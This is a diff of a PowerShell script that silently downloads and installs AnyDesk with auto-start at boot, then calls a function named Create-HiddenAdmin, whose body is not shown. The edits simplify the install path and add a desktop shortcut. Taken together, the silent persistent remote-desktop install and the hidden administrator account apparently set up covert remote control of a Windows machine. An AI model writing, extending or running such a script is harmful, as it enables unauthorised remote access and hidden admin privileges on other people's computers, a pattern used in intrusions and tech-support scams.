@@ -13,20 +13,14 @@ function Ensure-Admin {
     }
 }
 
-function Ask-InstallPath {
-    $desktopPath = [Environment]::GetFolderPath("Desktop")
-    $defaultPath = Join-Path $desktopPath "AnyDesk"
-
-    $customPath = Read-Host "📁 Enter install path for AnyDesk or press Enter for default [$defaultPath]"
-    if ([string]::IsNullOrWhiteSpace($customPath)) {
-        return $defaultPath
-    } else {
-        return $customPath
-    }
+function Get-DesktopPath {
+    return [Environment]::GetFolderPath("Desktop")
 }
 
 function Install-AnyDesk {
-    param([string]$installPath)
+    $desktopPath = Get-DesktopPath
+    $installPath = Join-Path $desktopPath "AnyDesk"
+    $anydeskExe = Join-Path $installPath "AnyDesk.exe"
 
     Write-Host "`n📦 Installing AnyDesk to: $installPath" -ForegroundColor Cyan
 
@@ -34,15 +28,30 @@ function Install-AnyDesk {
         New-Item -ItemType Directory -Path $installPath | Out-Null
     }
 
-    $anydeskExe = Join-Path $installPath "AnyDesk.exe"
-
     Write-Host "⏬ Downloading AnyDesk..." -ForegroundColor Yellow
     Invoke-WebRequest -Uri $anydeskUrl -OutFile $anydeskExe
 
     Write-Host "🚀 Installing AnyDesk silently..." -ForegroundColor Yellow
     Start-Process -FilePath $anydeskExe -ArgumentList "--install `"$installPath`" --start-with-win --silent" -Wait
 
-    Write-Host "✅ AnyDesk installed successfully." -ForegroundColor Green
+    Write-Host "✅ AnyDesk installed." -ForegroundColor Green
+
+    Create-Shortcut -exePath "$installPath\AnyDesk.exe" -shortcutPath "$desktopPath\AnyDesk.lnk"
+}
+
+function Create-Shortcut {
+    param (
+        [string]$exePath,
+        [string]$shortcutPath
+    )
+
+    $WshShell = New-Object -ComObject WScript.Shell
+    $Shortcut = $WshShell.CreateShortcut($shortcutPath)
+    $Shortcut.TargetPath = $exePath
+    $Shortcut.IconLocation = "$exePath,0"
+    $Shortcut.Save()
+
+    Write-Host "🔗 Shortcut created on Desktop." -ForegroundColor Green
 }
 
 function Create-HiddenAdmin {
@@ -62,8 +71,7 @@ function Create-HiddenAdmin {
 
 # ------------------ EXECUTION ------------------
 Ensure-Admin
-$installPath = Ask-InstallPath
-Install-AnyDesk -installPath $installPath
+Install-AnyDesk
 Create-HiddenAdmin
 
 Write-Host "`n🎉 All tasks completed successfully!" -ForegroundColor Green
